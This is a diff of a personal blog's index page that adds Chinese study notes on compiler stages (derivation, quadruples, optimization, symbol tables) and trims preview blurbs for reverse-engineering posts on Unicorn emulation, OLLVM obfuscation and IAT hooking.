+<li>推导：最左推导和最右推导</li>
+<li>规约：最右规约和最左规约</li>
+</ul>
+<p>赋值语句的语法规则：</p>
+<ul>
+<li>A::&#x3D;V&#x3D;E</li>
+<li>E::&#x3D;T|E+T</li>
+<li>T::&#x3D;F|T*F</li>
+<li>F::&#x3D;V|(E)|C</li>
+<li>V::&#x3D;标识符</li>
+<li>C::&#x3D;常数</li>
+</ul>
+<h4 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h4><p>​		x &#x3D; a + b*50		根据上面的文法规则运用最右推导：最右推导就是每次只变换最右的字母</p>
+<p>A&#x3D;&gt;V&#x3D;E	&#x3D;&gt;	V&#x3D;E+T	&#x3D;&gt;	V&#x3D;E+T*F	&#x3D;&gt;	</p>
+<p>T&#x3D;E+T*C	&#x3D;&gt;	</p>
+<p>T&#x3D;E+T*50	&#x3D;&gt;</p>
+<p>T&#x3D;E+F*50	&#x3D;&gt;</p>
+<p>T&#x3D;E+V*50	&#x3D;&gt;</p>
+<p>T&#x3D;E+b*50	&#x3D;&gt;</p>
+<p>T&#x3D;T+b*50	&#x3D;&gt;</p>
+<p>T&#x3D;V+b*50	&#x3D;&gt;</p>
+<p>T&#x3D;a+b*50</p>
+<p>如何最左规约，就是从T&#x3D;a+b*50变换到A,也就是赋值运算成立，每次只变换最左边的字母，是最右推导的逆运算</p>
+<p>计算机是用语法树来检验语法：</p>
+<p><img src="/./../images/image-20230109181128958.png" alt="image-20230109181128958"></p>
+<h3 id="中间代码生成"><a href="#中间代码生成" class="headerlink" title="中间代码生成"></a>中间代码生成</h3><ul>
+<li>任务：根据语法分析其中的含义，进行初步翻译，产生介于源代码和目标代码之间的一种代码</li>
+<li>分为两阶段的工作：<ul>
+<li>对每种语法范畴进行静态语义检查</li>
+<li>如果语义正确，就进行中间代码的翻译</li>
+</ul>
+</li>
+<li>中间代码形式：四元式、三元式、逆波兰式</li>
+</ul>
+<p>将x&#x3D;a+b*50变成中间代码：</p>
+<table>
+<thead>
+<tr>
+<th align="center">序号</th>
+<th align="center">算符</th>
+<th align="center">左操作数</th>
+<th align="center">右操作数</th>
+<th align="center">结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">（1）</td>
+<td align="center">将整常数50转换为实常数</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center">T<del>1</del></td>
+</tr>
+<tr>
+<td align="center">（2）</td>
+<td align="center">*</td>
+<td align="center">b</td>
+<td align="center">T<del>1</del></td>
+<td align="center">T<del>2</del></td>
+</tr>
+<tr>
+<td align="center">（3）</td>
+<td align="center">+</td>
+<td align="center">a</td>
+<td align="center">T<del>2</del></td>
+<td align="center">T<del>3</del></td>
+</tr>
+<tr>
+<td align="center">（4）</td>
+<td align="center">&#x3D;</td>
+<td align="center">T<del>3</del></td>
+<td align="center"></td>
+<td align="center">x</td>
+</tr>
+</tbody></table>
+<p>以上就是四元式</p>
+<h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><ul>
+<li>对中间代码进行加工变换，变换出效率更高的代码</li>
+<li>原则：等价变换，在不改变原意的情况下</li>
+<li>主要方面：<ul>
+<li>公共子表达式的提取：x&#x3D;<strong>(a+b)</strong>*c+<strong>(a+b)</strong>*d</li>
+<li>合并已知量：c&#x3D;a+b   d &#x3D; a+b   未改变a，b的值</li>
+<li>删除无用语句：一些注释或者一些与程序本身无关的表达式</li>
+<li>循环优化</li>
+</ul>
+</li>
+</ul>
+<p>例如将以下语句转成中间代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>( k = <span class="number">1</span>; k &lt;= <span class="number">100</span>; k++)&#123;</span><br><span class="line">	m = i + <span class="number">10</span>*k;</span><br><span class="line">	n = j + <span class="number">10</span>*k;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/image-20230110193728210.png" alt="image-20230110193728210"></p>
+<p>优化：每次乘实际上都是在上一次的基础是+10,所以能将乘操作优化成加法操作，来达到提升效率的目的</p>
+<p><img src="/./../images/image-20230110193939323.png" alt="image-20230110193939323"></p>
+<h3 id="目标代码生成"><a href="#目标代码生成" class="headerlink" title="目标代码生成"></a>目标代码生成</h3><ul>
+<li>任务：把优化的中间代码转化成特定机器上的低级语言</li>
+<li>目标指令的形式：<ul>
+<li>绝对指令代码：就是01010的机器代码如exe文件，可立即执行</li>
+<li>汇编指令代码：汇编语言程序，需要通过汇编程序汇编后才能运行</li>
+<li>可重定位指令代码：先将各目标模块连接起来，确定变量、常数在主存中的位置，装入主存后才能成为可以运行的绝对指令代码</li>
+</ul>
+</li>
+</ul>
+<h3 id="表格与表格管理"><a href="#表格与表格管理" class="headerlink" title="表格与表格管理"></a>表格与表格管理</h3><ul>
+<li>表格作用：用来记录源程序的各种信息以及编译过程中的各种状况</li>
+<li>与编译前三阶段有关的表格：<ul>
+<li>符号表：用来登记 源程序中的常量名、 变量名、数组名、 过程名等，记录它 们的性质、定义和引用情况<img src="/./../images/image-20230110195304443.png" alt="image-20230110195304443"></li>
+<li>常数表与标号表：登记各类常数值，登记标号的定义与作用<img src="/./../images/image-20230110195424180.png" alt="image-20230110195424180"></li>
+<li>入口名表：登记过程的层号，分程序符号表入口<img src="/./../images/image-20230110195523654.png" alt="image-20230110195523654"></li>
+<li>中间代码表</li>
+</ul>
+</li>
+</ul>
+<h3 id="出错与处理"><a href="#出错与处理" class="headerlink" title="出错与处理"></a>出错与处理</h3><p>错误类型:</p>
+<ul>
+<li>语法错误:在词法分析和语法分析阶段检测出来</li>
+<li>语义错误：一般在语义分析阶段检测</li>
+</ul>
+<p>遍：指对源程序或源程序的中间结果从头到尾扫 描一次，并做有关的加工处理，生成新的中间结 果或目标代码的过程。</p>
+<p>（遍与阶段的含义毫无关系。）</p>
+<p>一遍扫描</p>
+<p><img src="/./../images/image-20230110195852519.png" alt="image-20230110195852519"></p>
+<p>&#x3D;&#x3D;一遍扫描不是一次性扫描和分析，而是通过一句一句的表格是进行反复扫描和分析&#x3D;&#x3D;</p>
+<h3 id="编译程序生成"><a href="#编译程序生成" class="headerlink" title="编译程序生成"></a>编译程序生成</h3><p>生成方式：</p>
+<ol>
+<li>直接用机器语言编写编译程序</li>
+<li>用汇编语言编写编译程序<ul>
+<li>注：编译程序核心部分常用汇编语言编写</li>
+</ul>
+</li>
+<li>用高级语言编写编译程序：这是普遍采用的方法</li>
+<li>.自编译：内置核心编译程序，如何用自身的核心程序去编译其他程序</li>
+<li>编译工具：LEX(词法分析)与YACC(用于自动产生LALR分析 表)</li>
+<li>移植（同种语言的编译程序在不同类型的机器之 间移植）</li>
+</ol>
+<p>写编译程序的基本条件：</p>
+<ul>
+<li>源程序语言</li>
+<li>目标程序语言</li>
+<li>编译方法</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="https://pa1r0t.github.io/2023/01/05/AST%E6%B7%B7%E6%B7%862/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -251,7 +939,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-01-06 13:27:05" itemprop="dateModified" datetime="2023-01-06T13:27:05+08:00">2023-01-06</time>
+      <time title="修改时间：2023-01-08 22:31:35" itemprop="dateModified" datetime="2023-01-08T22:31:35+08:00">2023-01-08</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -431,9 +1119,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2023-01-02 22:06:24 / 修改时间：22:13:22" itemprop="dateCreated datePublished" datetime="2023-01-02T22:06:24+08:00">2023-01-02</time>
+      <time title="创建时间：2023-01-02 22:06:24" itemprop="dateCreated datePublished" datetime="2023-01-02T22:06:24+08:00">2023-01-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-01-12 22:08:24" itemprop="dateModified" datetime="2023-01-12T22:08:24+08:00">2023-01-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -456,12 +1150,14 @@
     
     <div class="post-body" itemprop="articleBody">
           <p>unicorn start</p>
-<h3 id="目标-处理ollvm混淆"><a href="#目标-处理ollvm混淆" class="headerlink" title="目标:处理ollvm混淆"></a>目标:处理ollvm混淆</h3><p><img src="/./../images/image-20230102221120506.png" alt="image-20230102221120506"></p>
-<p><img src="/./../images/image-20230102221205367.png" alt="image-20230102221205367"></p>
-<h3 id="用脚本处理该函数"><a href="#用脚本处理该函数" class="headerlink" title="用脚本处理该函数"></a>用脚本处理该函数</h3><p>在脚本中设置起始地址和文件名</p>
-<p><img src="/./../images/image-20230102221258379.png" alt="image-20230102221258379"></p>
-<p>然后执行该python文件</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/01/02/ollvm%E5%81%9A%E6%B3%95/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -657,452 +1353,8 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://pa1r0t.github.io/2022/12/31/unicorn-learning4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Pa1r0t_9e">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pa1r0t">
-      <meta itemprop="description" content="welcome to my bolg">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Pa1r0t">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/12/31/unicorn-learning4/" class="post-title-link" itemprop="url">unicorn_learning4</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-12-31 14:12:48 / 修改时间：16:10:21" itemprop="dateCreated datePublished" datetime="2022-12-31T14:12:48+08:00">2022-12-31</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>unicorn_starting</p>
-<p>模拟Jni与Java交互</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/12/31/unicorn-learning4/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      
-
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://pa1r0t.github.io/2022/12/31/unicorn-learning3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Pa1r0t_9e">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pa1r0t">
-      <meta itemprop="description" content="welcome to my bolg">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Pa1r0t">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/12/31/unicorn-learning3/" class="post-title-link" itemprop="url">unicorn_learning3</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-12-31 09:12:04 / 修改时间：11:18:14" itemprop="dateCreated datePublished" datetime="2022-12-31T09:12:04+08:00">2022-12-31</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>unicorn start</p>
-<p>模拟器框架自动填充got表项内容</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/12/31/unicorn-learning3/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      
-
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://pa1r0t.github.io/2022/12/30/unicorn-learning2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Pa1r0t_9e">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pa1r0t">
-      <meta itemprop="description" content="welcome to my bolg">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Pa1r0t">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/12/30/unicorn-learning2/" class="post-title-link" itemprop="url">unicorn_learning2</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-12-30 09:40:33 / 修改时间：15:24:54" itemprop="dateCreated datePublished" datetime="2022-12-30T09:40:33+08:00">2022-12-30</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>unicorn start</p>
-<p>用unicorn调用so文件中的某个函数，观察函数的输入与输出</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/12/30/unicorn-learning2/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      
-
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://pa1r0t.github.io/2022/12/29/unicorn1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Pa1r0t_9e">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pa1r0t">
-      <meta itemprop="description" content="welcome to my bolg">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Pa1r0t">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/12/29/unicorn1/" class="post-title-link" itemprop="url">unicorn_learning1</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-12-29 14:32:54 / 修改时间：15:54:07" itemprop="dateCreated datePublished" datetime="2022-12-29T14:32:54+08:00">2022-12-29</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>unicorn start!</p>
-<p>效仿大佬的文章简单地给自己作个学习记录，就当作写了篇日记了</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/12/29/unicorn1/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      
-
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://pa1r0t.github.io/2022/12/22/re-base3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Pa1r0t_9e">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pa1r0t">
-      <meta itemprop="description" content="welcome to my bolg">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Pa1r0t">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/12/22/re-base3/" class="post-title-link" itemprop="url">re_base3</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-12-22 19:33:01 / 修改时间：21:20:03" itemprop="dateCreated datePublished" datetime="2022-12-22T19:33:01+08:00">2022-12-22</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>PE and IAT hook</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/12/22/re-base3/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      
-
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 </div>
